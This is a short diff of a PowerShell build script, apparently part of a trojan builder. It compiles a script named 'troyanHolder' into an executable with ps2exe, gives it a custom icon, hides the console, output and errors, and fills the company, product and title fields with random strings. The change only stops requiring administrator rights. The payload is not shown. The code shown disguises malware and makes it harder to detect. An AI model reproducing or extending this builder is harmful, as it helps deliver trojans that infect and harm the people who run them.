@@ -33,11 +33,12 @@ if (-not (Test-Path -Path $server.userTroyanIco))
 Remove-FileIfExists -filePath $server.troyanExe
 Remove-FileIfExists -filePath $server.userTroyanExe
 
+ #-requireAdmin
 Invoke-ps2exe `
     -inputFile $server.troyanHolder `
     -outputFile $server.troyanExe `
     -iconFile $server.troyanIco `
-    -STA -x86 -UNICODEEncoding -requireAdmin -noOutput -noError -noConsole `
+    -STA -x86 -UNICODEEncoding -noOutput -noError -noConsole `
     -company (Get-RandomString) `
     -product (Get-RandomString) `
     -title (Get-RandomString) `
